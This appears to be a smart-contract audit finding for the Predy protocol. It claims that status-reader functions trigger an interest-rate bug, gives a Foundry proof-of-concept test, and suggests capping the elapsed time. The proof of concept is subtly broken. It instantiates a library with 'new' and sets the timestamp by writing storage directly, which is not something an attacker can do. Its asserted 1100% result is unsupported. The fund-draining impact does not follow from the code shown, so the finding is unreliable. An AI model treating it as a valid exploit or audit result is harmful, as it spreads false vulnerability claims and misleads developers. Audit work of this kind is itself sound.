# Vulnerability details

## Impact
The [getPairStatus()](https://github.com/code-423n4/2024-05-predy/blob/a9246db5f874a91fb71c296aac6a66902289306a/src/libraries/logic/ReaderLogic.sol#L16C1-L22C6) and [getVaultStatus()](https://github.com/code-423n4/2024-05-predy/blob/a9246db5f874a91fb71c296aac6a66902289306a/src/libraries/logic/ReaderLogic.sol#L24) functions in the [ReaderLogic](https://github.com/code-423n4/2024-05-predy/blob/a9246db5f874a91fb71c296aac6a66902289306a/src/libraries/logic/ReaderLogic.sol#L17) library allow external callers to retrieve the status of a specific pair or vault, which seems smooth. However, these functions call the [applyInterestForToken()](https://github.com/code-423n4/2024-05-predy/blob/a9246db5f874a91fb71c296aac6a66902289306a/src/libraries/ApplyInterestLib.sol#L26) function from the [ApplyInterestLib](https://github.com/code-423n4/2024-05-predy/blob/a9246db5f874a91fb71c296aac6a66902289306a/src/libraries/ApplyInterestLib.sol#L26) library, which contains the vulnerable [applyInterestForPoolStatus()](https://github.com/code-423n4/2024-05-predy/blob/a9246db5f874a91fb71c296aac6a66902289306a/src/libraries/ApplyInterestLib.sol#L50) function.

An attacker could exploit this vulnerability by repeatedly calling the `getPairStatus` or `getVaultStatus` function with a manipulated `pairId` or `vaultId` that corresponds to a pair or vault with a large time difference between the current `block.timestamp` and the `lastUpdateTimestamp`. Each call to these functions will then trigger the interest rate calculation bug in `applyInterestForPoolStatus`, resulting in unexpectedly high interest rates and potential draining of funds from the protocol.

## Proof of Concept
Here's a Foundry test that demonstrates the attack:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../src/ReaderLogic.sol";

contract ReaderLogicTest is Test {
    ReaderLogic private readerLogic;
    GlobalDataLibrary.GlobalData private globalData;

    function setUp() public {
        readerLogic = new ReaderLogic();
        // Set up the globalData with necessary data
        // ...
    }

    function testExploit() public {
        uint256 pairId = 1;
        uint256 manipulatedTimestamp = block.timestamp - 100 * 365 days;

        // Simulate the attacker calling the getPairStatus function with manipulated pairId
        globalData.pairs[pairId].lastUpdateTimestamp = manipulatedTimestamp;
        readerLogic.getPairStatus(globalData, pairId);

        // Assert that the interest rate is unexpectedly high
        DataType.PairStatus memory pairStatus = globalData.pairs[pairId];
        assertEq(pairStatus.quotePool.tokenStatus.loanScaler, 11e18); // 1100% interest rate
    }
}
```

In the test, an attacker sets up a pair with a manipulated `lastUpdateTimestamp` that is significantly lower than the current `block.timestamp`. By calling the `getPairStatus` function with the manipulated `pairId`, the attacker triggers the interest rate calculation bug, resulting in an unexpectedly high interest rate.

## Recommended Mitigation Steps
To mitigate this, it is recommended to apply a limit to the maximum time difference allowed in the interest rate calculation. Update the [applyInterestForPoolStatus()](https://github.com/code-423n4/2024-05-predy/blob/a9246db5f874a91fb71c296aac6a66902289306a/src/libraries/ApplyInterestLib.sol#L50) function in the `ApplyInterestLib` library with the following code:

```solidity
function applyInterestForPoolStatus(Perp.AssetPoolStatus storage poolStatus, uint256 lastUpdateTimestamp, uint8 fee)
    internal
    returns (uint256 interestRate, uint256 totalProtocolFee)
{
    // ...

    uint256 timeDifference = block.timestamp - lastUpdateTimestamp;
    uint256 maxTimeDifference = 365 days; // Adjust the maximum time difference as needed
    timeDifference = timeDifference > maxTimeDifference ? maxTimeDifference : timeDifference;

    interestRate = InterestRateModel.calculateInterestRate(poolStatus.irmParams, utilizationRatio)
        * timeDifference / 365 days;

    // ...
}
```

By limiting this time difference to a reasonable max value, the exploit becomes ineffective, not possible, as the interest rate calculation will not result in unexpectedly high values even if the attacker manipulates the `lastUpdateTimestamp`.
